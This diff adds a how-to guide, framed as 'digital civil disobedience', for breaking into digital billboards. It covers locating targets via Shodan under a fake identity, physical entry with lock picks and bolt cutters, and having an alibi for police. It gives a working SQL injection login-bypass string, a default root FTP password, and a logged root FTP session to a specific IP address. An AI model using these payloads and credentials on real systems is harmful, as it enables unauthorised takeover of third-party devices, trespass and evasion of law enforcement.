@@ -1,1 +1,88 @@
-bruteforce-billboar
+bruteforce-billboard
+Digital Civil Disobedience: Guerrilla Advertising
+
+Billboard 
+To my knowledge, three primary types of billboards exist: 
+The first type contains a Verizon Telephone Network Interface with clearly marked ADSL POTS splitter and half-ringer. 
+Instructions as to the testing and wiring of telephone line accessible from an exposed phone jack the suggest the performance of a basic GO-NO-GO continuity test from the site of said billboard; further use and/or potential vulnerabilities of this line for remote access are unknown. 
+Self-actuated data connections for update purposes are presumed. 
+
+Wireless/Satelite 
+The second type of billboard site noted contains a nondescript box with a satellite dish. 
+It is known that the only three methods of billboard access and maintenance are satellite, POTS and wireless. 
+The existence of POTS in addition to potentially unencrypted wireless traffic at the sites of digital billboards presents a theoretical security risk in the instance of the presence of potential intruders on the intranet. 
+
+They are vulnerable to: 
+-People connecting wirelessly (that’s right folks, to connect, you don’t have to worry about passwords or encryption) -Packet sniffing (able to see where they’re broadcasting to, could spoof the address, and voila) 
+-War dialing 
+They are guilty of: 
+-Not closing unused ports -Using default usernames/passwords (admin, password, etc.) -Using global usernames/passwords 
+
+What you need to know. 
+Image requirements 
+From The Company’s web site: 
+DIGITAL BULLETINs 
+200 h x 704 w pixel resolution or 
+2.778” h x 9.778” w (No Bleed) RGB / 72 DPI / JPG format 
+Which billboard you’re going to go to 
+It helps to plan ahead and know your target. 
+Have an alibi 
+This is useful for when you’re questioned by authority figures (police, parents etc.) 
+
+Tools needed:
+A laptop
+Lock pick kit 
+Bolt cutters just in case 
+Basic tools depending on what type of billboard it is. Again know your target and do your Intel beforehand.  
+
+So how to hack it? 
+We will be using shodan. https://www.shodan.io Once your registered at Shodan you can use the search feature to find all vulnerable billboards. Use fake name and untraceable email. Leave no footprints. 
+The Username Parameter is vulnerable to SQL Injection…
+So to Login, paste in the username parameter…
+-1558" OR 9005=9005 AND "UxGI"="UxGI
+and anything in the password input. Now click login!
+Once logged in, take a look at the top right corner you should now be logged in as a Super Admin.
+From here you now have full access to the digital billboard and you can control everything from what shows on it, to changing all the display and power settings even enabling the built in WIFI and giving everyone free WIFI.
+But wait that’s not all!!!!
+There is another vulnerability in these billboards, which is a default root password vulnerability. You can basically get root FTP access to all of these billboards with the details below….
+Username: root
+Password: 111111
+ 
+$ ftp 186.206.188.175
+ Connected to 186.206.188.175.
+ 220 Welcome to blah FTP service.
+ Name (186.206.188.175): root
+ 331 Please specify the password.
+ Password:
+ 230 Login successful.
+ Remote system type is UNIX.
+ Using binary mode to transfer files.
+ ftp> cd /
+ 250 Directory successfully changed.ftp> passive
+ Passive mode on.
+ ftp> ls
+ 229 Entering Extended Passive Mode (|||41314|).
+ 150 Here comes the directory listing.
+ drwxr-xr-x 1 0 0 1464 Jan 01 1970 bin
+ lrwxrwxrwx 1 0 0 21 Jan 01 1970 c: -> /usr/local/playdata/c
+ lrwxrwxrwx 1 0 0 21 Jan 01 1970 d: -> /usr/local/playdata/d
+ drwxr-xr-x 7 0 0 0 May 21 18:08 dev
+ lrwxrwxrwx 1 0 0 21 Jan 01 1970 e: -> /usr/local/playdata/e
+ drwxr-xr-x 1 0 0 748 Jan 01 1970 etc
+ lrwxrwxrwx 1 0 0 21 Jan 01 1970 f: -> /usr/local/playdata/f
+ drwxr-xr-x 1 0 0 36 Jan 01 1970 home
+ drwxr-xr-x 1 0 0 1868 Jan 01 1970 lib
+ lrwxrwxrwx 1 0 0 11 Jan 01 1970 linuxrc -> bin/busybox
+ drwxr-xr-x 1 0 0 32 Jan 01 1970 mnt
+ drwxr-xr-x 1 0 0 0 Jan 01 1970 opt
+ dr-xr-xr-x 51 0 0 0 Jan 01 1970 proc
+ drwxr-xr-x 1 0 0 116 Jan 01 1970 root
+ drwxr-xr-x 1 0 0 1332 Jan 01 1970 sbin
+ drwxr-xr-x 12 0 0 0 Jan 01 1970 sys
+ drwxrwxrwt 6 0 0 720 May 21 18:16 tmp
+ drwxr-xr-x 1 0 0 108 Jan 01 1970 usr
+ drwxr-xr-x 3 0 0 672 Jan 01 1970 var
+ drwxr-xr-x 4 0 0 288 Jan 01 1970 www
+ 226 Directory send OK.
+ ftp>
+You now have root access to the entire server.
